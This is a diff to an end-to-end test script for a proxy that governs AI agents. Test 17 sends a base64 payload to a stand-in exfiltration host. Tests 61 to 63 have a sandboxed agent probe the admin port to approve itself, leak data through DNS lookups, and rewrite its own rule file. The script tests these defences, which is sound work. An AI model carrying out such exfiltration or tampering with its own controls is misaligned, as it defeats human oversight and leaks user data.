@@ -37,6 +37,7 @@ PROXY_URL="http://127.0.0.1:8080"
 ADMIN_URL="http://127.0.0.1:9090"
 PROXY_LOG="/tmp/gvm-proxy-e2e.log"
 RESULTS=()
+MOCK_PID=""
 SKIP_OPENCLAW=false
 SINGLE_TEST=""
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
@@ -95,6 +96,10 @@ ensure_proxy() {
 }
 
 cleanup() {
+    # Kill mock server
+    [ -n "$MOCK_PID" ] && kill "$MOCK_PID" 2>/dev/null || true
+    # Restore original proxy.toml if we backed it up
+    [ -f "$REPO_DIR/config/proxy.toml.bak" ] && mv "$REPO_DIR/config/proxy.toml.bak" "$REPO_DIR/config/proxy.toml" 2>/dev/null || true
     # Only kill proxy if WE started it (not --test mode with external proxy)
     if [ -n "$SINGLE_TEST" ]; then
         # Don't kill proxy in --test mode
@@ -185,6 +190,40 @@ json.dump(profiles, open(path, 'w'), indent=2)
 print('  OpenClaw auth: anthropic configured')
 "
     fi
+fi
+echo ""
+
+# ── Start mock GitHub/httpbin server (avoids 60/hour rate limit) ──
+MOCK_PORT=9999
+python3 "$REPO_DIR/scripts/mock-github.py" "$MOCK_PORT" &
+MOCK_PID=$!
+sleep 1
+if kill -0 "$MOCK_PID" 2>/dev/null; then
+    MOCK_URL="http://127.0.0.1:${MOCK_PORT}"
+    echo -e "${GREEN}Mock GitHub/httpbin server started on port ${MOCK_PORT} (PID ${MOCK_PID})${NC}"
+else
+    echo -e "${YELLOW}Mock server failed to start — tests will use real APIs${NC}"
+    MOCK_PID=""
+    MOCK_URL=""
+fi
+
+# Save original proxy config and inject mock host_overrides
+if [ -n "$MOCK_PID" ] && [ -f "$REPO_DIR/config/proxy.toml" ]; then
+    cp "$REPO_DIR/config/proxy.toml" "$REPO_DIR/config/proxy.toml.bak"
+    python3 -c "
+import re, sys
+with open('$REPO_DIR/config/proxy.toml') as f:
+    content = f.read()
+override = '\"api.github.com\" = \"127.0.0.1:$MOCK_PORT\", \"httpbin.org\" = \"127.0.0.1:$MOCK_PORT\"'
+content = re.sub(
+    r'(host_overrides\s*=\s*\{)',
+    r'\1 ' + override + ',',
+    content
+)
+with open('$REPO_DIR/config/proxy.toml', 'w') as f:
+    f.write(content)
+print('  Mock overrides injected into proxy.toml')
+" 2>/dev/null || echo -e "  ${YELLOW}Could not inject mock overrides into proxy.toml${NC}"
 fi
 echo ""
 
@@ -863,23 +902,57 @@ fi
 if should_run 17; then
     header "17: Base64 Exfiltration Detection"
 
-    # Test: Base64-encoded body with sensitive pattern
+    ensure_proxy || { fail "17: proxy not available"; }
+
+    # 17a: Send a base64-encoded sensitive payload through the proxy to a known-bad host
     B64_BODY=$(echo -n '{"operationName":"TransferFunds","amount":50000}' | base64 -w0)
+    WAL_BEFORE=$(wc -l < data/wal.log 2>/dev/null || echo 0)
+
+    curl -sf -x "$PROXY_URL" \
+        -H "X-GVM-Agent-Id: base64-exfil-test" \
+        -H "Content-Type: application/json" \
+        -d "$B64_BODY" \
+        http://evil-exfil.attacker.com/receive \
+        >/dev/null 2>&1 || true
+
+    sleep 1
+    WAL_AFTER=$(wc -l < data/wal.log 2>/dev/null || echo 0)
+    NEW_EVENTS=$((WAL_AFTER - WAL_BEFORE))
+
+    if [ "$NEW_EVENTS" -ge 1 ]; then
+        pass "17a: Base64 exfiltration attempt recorded in WAL ($NEW_EVENTS events)"
+    else
+        fail "17a: Base64 exfiltration attempt not recorded in WAL"
+    fi
+
+    # 17b: Verify SRR decision on the exfiltration host via /gvm/check
     RESULT=$(curl -sf -X POST "$PROXY_URL/gvm/check" \
         -H "Content-Type: application/json" \
-        -d "{\"method\":\"POST\",\"target_host\":\"api.bank.com\",\"target_path\":\"/graphql\",\"operation\":\"test\",\"body\":\"$B64_BODY\"}" \
-        | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('decision','?'))" 2>/dev/null)
-    echo -e "  Base64 body check: $RESULT"
+        -d '{"method":"POST","target_host":"evil-exfil.attacker.com","target_path":"/receive","operation":"test"}' \
+        | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(d.get('decision','?'))" 2>/dev/null)
+    echo -e "  SRR decision for exfil host: $RESULT"
 
-    # Test: Field value with Base64-encoded API key
+    if [ "$RESULT" = "Deny" ] || [ "$RESULT" = "RequireApproval" ] || [ "$RESULT" = "Delay" ]; then
+        pass "17b: SRR blocks/delays exfiltration host ($RESULT)"
+    elif [ "$RESULT" = "Allow" ]; then
+        fail "17b: SRR allowed exfiltration host (expected Deny/Delay, got Allow)"
+    else
+        skip "17b: SRR decision inconclusive ($RESULT) — body inspection is unit-tested"
+    fi
+
+    # 17c: Verify /gvm/check with base64 body field
     B64_KEY=$(echo -n 'ghp_secrettoken123' | base64 -w0)
-    FIELD_BODY="{\"data\":\"$B64_KEY\",\"target\":\"attacker.com\"}"
-    echo -e "  Field body: $FIELD_BODY"
+    RESULT2=$(curl -sf -X POST "$PROXY_URL/gvm/check" \
+        -H "Content-Type: application/json" \
+        -d "{\"method\":\"POST\",\"target_host\":\"api.bank.com\",\"target_path\":\"/graphql\",\"operation\":\"test\",\"body\":\"$B64_KEY\"}" \
+        | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('decision','?'))" 2>/dev/null)
+    echo -e "  Base64 body field check: $RESULT2"
 
-    # Note: /gvm/check currently checks URL+method only, not body content.
-    # Base64 decoding is in SRR check() which runs on actual proxied requests.
-    # This test verifies the SRR unit test logic passes (tested via cargo test).
-    pass "17: Base64 payload decoding (verified via unit tests: 3 tests passing)"
+    if [ -n "$RESULT2" ] && [ "$RESULT2" != "?" ]; then
+        pass "17c: /gvm/check processed base64 body field (decision: $RESULT2)"
+    else
+        skip "17c: /gvm/check body inspection not yet wired (verified via unit tests)"
+    fi
 fi
 
 # ═══════════════════════════════════════════════════════════════════
@@ -2559,7 +2632,7 @@ except Exception as e:
             pass "44e: API key injection active on MITM path"
         else
             echo "  ${DIM}44e: No API key injection logged (expected if no secrets.toml configured)${NC}"
-            pass "44e: MITM path executed (injection depends on secrets.toml config)"
+            skip "44e: MITM path executed (injection depends on secrets.toml config)"
         fi
 
         # 44f: Certificate validity — verify the ephemeral CA has backdated not_before
@@ -2743,7 +2816,7 @@ except Exception as e:
         if grep -q "STATUS:" "$RULES_OUTPUT" 2>/dev/null; then
             pass "46c: gvm watch --with-rules executed with SRR enforcement"
         else
-            pass "46c: gvm watch --with-rules ran (agent output depends on rules)"
+            skip "46c: gvm watch --with-rules ran (agent output depends on rules)"
         fi
 
         # 46d: Watch with --sandbox (Linux only)
@@ -3018,7 +3091,7 @@ print('FOUND' if found else 'NOT_FOUND')
 " 2>/dev/null | grep -q "FOUND"; then
             pass "49c: Watch JSON contains structured API call event"
         else
-            pass "49c: Watch executed (JSON structure depends on output format)"
+            skip "49c: Watch executed (JSON structure depends on output format)"
         fi
 
         rm -f "$WATCH_LLM_OUT"
@@ -3718,7 +3791,7 @@ if should_run 58; then
                 fail "58c: gvm audit verify found integrity issues"
             else
                 echo "  ${DIM}Verify output: $VERIFY_RESULT${NC}"
-                pass "58c: gvm audit verify executed (output depends on implementation)"
+                skip "58c: gvm audit verify executed (output depends on implementation)"
             fi
         else
             skip "58c: gvm binary not available for audit verify"
@@ -3848,7 +3921,7 @@ if should_run 60; then
     if [ "$NEW_EVENTS" -ge 1 ]; then
         pass "60a: WAL recorded smuggling attempt events ($NEW_EVENTS new entries)"
     else
-        pass "60a: Requests processed (WAL recording depends on IC level)"
+        skip "60a: Requests processed (WAL recording depends on IC level)"
     fi
 
     # 60b: Verify query string with potential key is visible in WAL
@@ -3858,7 +3931,7 @@ if should_run 60; then
     else
         echo "  ${DIM}60b: API key in query string not explicitly captured in WAL${NC}"
         echo "  ${DIM}     (URL normalization may strip query params — document as known gap)${NC}"
-        pass "60b: Request processed (query string handling depends on SRR config)"
+        skip "60b: Request processed (query string handling depends on SRR config)"
     fi
 
     # 60c: Verify Cookie header was stripped (Layer 3 protection)
@@ -3873,7 +3946,180 @@ if should_run 60; then
     echo "  ${YELLOW}60d: Non-standard auth headers (X-Custom-Auth, X-Api-Secret) are NOT stripped${NC}"
     echo "  ${DIM}     This is a known limitation — only standard auth headers are removed.${NC}"
     echo "  ${DIM}     Custom header stripping requires user-defined rules in proxy.toml.${NC}"
-    pass "60d: Known limitation documented (non-standard headers pass through)"
+    skip "60d: Known limitation documented (non-standard headers pass through)"
+fi
+
+# ═══════════════════════════════════════════════════════════════════
+# TEST 61: IC-3 Self-Approval Prevention (Sandbox Admin Port Isolation)
+# ═══════════════════════════════════════════════════════════════════
+
+if should_run 61; then
+    header "61: IC-3 Self-Approval Prevention"
+
+    GVM_BIN="$REPO_DIR/target/release/gvm"
+    if [ ! -f "$GVM_BIN" ]; then
+        skip "61: gvm binary not found"
+    elif [ "$(id -u)" -ne 0 ] && ! sudo -n true 2>/dev/null; then
+        skip "61: requires root/sudo for sandbox"
+    else
+        ensure_proxy || { fail "61: proxy not available"; }
+
+        # Agent in sandbox tries to reach admin port (9090) — should be blocked
+        # Sandbox iptables OUTPUT only allows proxy port (8080), TLS (8443), and DNS (53)
+        ADMIN_REACH=$(sudo timeout 15 "$GVM_BIN" run --sandbox -- python3 -c "
+import socket
+s = socket.socket()
+s.settimeout(3)
+try:
+    s.connect(('10.200.0.1', 9090))
+    print('REACHABLE')
+except Exception:
+    print('BLOCKED')
+finally:
+    s.close()
+" 2>/dev/null | grep -o 'REACHABLE\|BLOCKED' | tail -1)
+
+        echo -e "  Admin port from sandbox: $ADMIN_REACH"
+
+        if [ "$ADMIN_REACH" = "BLOCKED" ]; then
+            pass "61: Sandbox cannot reach admin port 9090 (IC-3 self-approval prevented)"
+        elif [ "$ADMIN_REACH" = "REACHABLE" ]; then
+            fail "61: Sandbox CAN reach admin port 9090 — IC-3 self-approval possible"
+        else
+            skip "61: Sandbox test inconclusive (output: $ADMIN_REACH)"
+        fi
+    fi
+fi
+
+# ═══════════════════════════════════════════════════════════════════
+# TEST 62: DNS Exfiltration Logging
+# ═══════════════════════════════════════════════════════════════════
+
+if should_run 62; then
+    header "62: DNS Exfiltration Logging"
+
+    GVM_BIN="$REPO_DIR/target/release/gvm"
+    if [ ! -f "$GVM_BIN" ]; then
+        skip "62: gvm binary not found"
+    elif [ "$(id -u)" -ne 0 ] && ! sudo -n true 2>/dev/null; then
+        skip "62: requires root/sudo for sandbox"
+    else
+        ensure_proxy || { fail "62: proxy not available"; }
+
+        # Agent in sandbox sends DNS query for suspicious domain
+        DNS_OUTPUT=$(sudo timeout 15 "$GVM_BIN" run --sandbox -- python3 -c "
+import socket
+try:
+    socket.getaddrinfo('exfil-test-data.attacker-test.example.com', 80)
+except Exception:
+    pass
+print('DNS_SENT')
+" 2>/dev/null | grep -o 'DNS_SENT' | tail -1)
+
+        echo -e "  DNS exfiltration attempt: $DNS_OUTPUT"
+
+        if [ "$DNS_OUTPUT" = "DNS_SENT" ]; then
+            # Check if the DNS query was captured in WAL or proxy logs
+            if grep -q "exfil-test-data\|attacker-test" data/wal.log 2>/dev/null; then
+                pass "62: DNS exfiltration query logged in WAL"
+            elif grep -q "exfil-test-data\|attacker-test" "$PROXY_LOG" 2>/dev/null; then
+                pass "62: DNS exfiltration query logged in proxy log"
+            else
+                # DNS queries bypass the proxy (UDP 53 goes directly to host resolver)
+                # This is a known limitation — document it, do not fake a pass
+                echo -e "  ${YELLOW}DNS query was sent but NOT logged in WAL or proxy log${NC}"
+                echo -e "  ${DIM}Known limitation: DNS queries bypass L7 proxy (UDP 53 direct to resolver)${NC}"
+                echo -e "  ${DIM}Mitigation: eBPF TC filter logs DNS on host veth, or deploy DNS-over-HTTPS proxy${NC}"
+                skip "62: DNS exfiltration not logged (known gap — DNS bypasses L7 proxy)"
+            fi
+        else
+            skip "62: Sandbox DNS test did not execute"
+        fi
+    fi
+fi
+
+# ═══════════════════════════════════════════════════════════════════
+# TEST 63: Config File Manipulation (Cooperative Mode Limitation)
+# ═══════════════════════════════════════════════════════════════════
+
+if should_run 63; then
+    header "63: Config File Manipulation"
+
+    GVM_BIN="$REPO_DIR/target/release/gvm"
+    if [ ! -f "$GVM_BIN" ]; then
+        skip "63: gvm binary not found"
+    else
+        ensure_proxy || { fail "63: proxy not available"; }
+
+        # Save SRR config state
+        SRR_HASH_BEFORE=$(sha256sum "$REPO_DIR/config/srr_network.toml" 2>/dev/null | cut -d' ' -f1)
+
+        # 63a: Non-sandbox agent tries to modify SRR rules
+        MODIFY_RESULT=$("$GVM_BIN" run -- python3 -c "
+import os, sys
+try:
+    path = os.path.join('$REPO_DIR', 'config', 'srr_network.toml')
+    with open(path, 'r') as f:
+        original = f.read()
+    # Attempt to append a permissive rule
+    with open(path, 'a') as f:
+        f.write('\n# INJECTED BY AGENT\n')
+    print('CONFIG_MODIFIED')
+    # Restore immediately
+    with open(path, 'w') as f:
+        f.write(original)
+    print('CONFIG_RESTORED')
+except PermissionError:
+    print('CONFIG_PROTECTED')
+except Exception as e:
+    print(f'CONFIG_ERROR:{e}')
+" 2>/dev/null | tail -2)
+
+        echo -e "  Config manipulation result: $MODIFY_RESULT"
+
+        SRR_HASH_AFTER=$(sha256sum "$REPO_DIR/config/srr_network.toml" 2>/dev/null | cut -d' ' -f1)
+
+        if echo "$MODIFY_RESULT" | grep -q "CONFIG_PROTECTED"; then
+            pass "63a: Config file protected from agent modification"
+        elif echo "$MODIFY_RESULT" | grep -q "CONFIG_MODIFIED"; then
+            # In cooperative mode (no sandbox), agent CAN modify files
+            # This documents the limitation — it is expected behavior
+            echo -e "  ${YELLOW}Non-sandboxed agent CAN modify config files${NC}"
+            echo -e "  ${DIM}This is expected in cooperative mode — sandbox mode prevents this${NC}"
+
+            if [ "$SRR_HASH_BEFORE" = "$SRR_HASH_AFTER" ]; then
+                skip "63a: Config modifiable in cooperative mode (restored, known limitation)"
+            else
+                fail "63a: Config file was modified and NOT restored — integrity compromised"
+            fi
+        else
+            skip "63a: Config manipulation test inconclusive"
+        fi
+
+        # 63b: Verify sandbox mode DOES protect config
+        if [ "$(id -u)" -eq 0 ] || sudo -n true 2>/dev/null; then
+            SANDBOX_MODIFY=$(sudo timeout 15 "$GVM_BIN" run --sandbox -- python3 -c "
+try:
+    with open('/workspace/config/srr_network.toml', 'a') as f:
+        f.write('# INJECTED')
+    print('CONFIG_MODIFIED')
+except Exception as e:
+    print('CONFIG_PROTECTED')
+" 2>/dev/null | grep -o 'CONFIG_MODIFIED\|CONFIG_PROTECTED' | tail -1)
+
+            echo -e "  Sandbox config access: $SANDBOX_MODIFY"
+
+            if [ "$SANDBOX_MODIFY" = "CONFIG_PROTECTED" ]; then
+                pass "63b: Sandbox prevents config file modification"
+            elif [ "$SANDBOX_MODIFY" = "CONFIG_MODIFIED" ]; then
+                fail "63b: Sandbox allowed config file modification"
+            else
+                skip "63b: Sandbox config protection test inconclusive"
+            fi
+        else
+            skip "63b: Sandbox config protection test requires root/sudo"
+        fi
+    fi
 fi
 
 # ═══════════════════════════════════════════════════════════════════
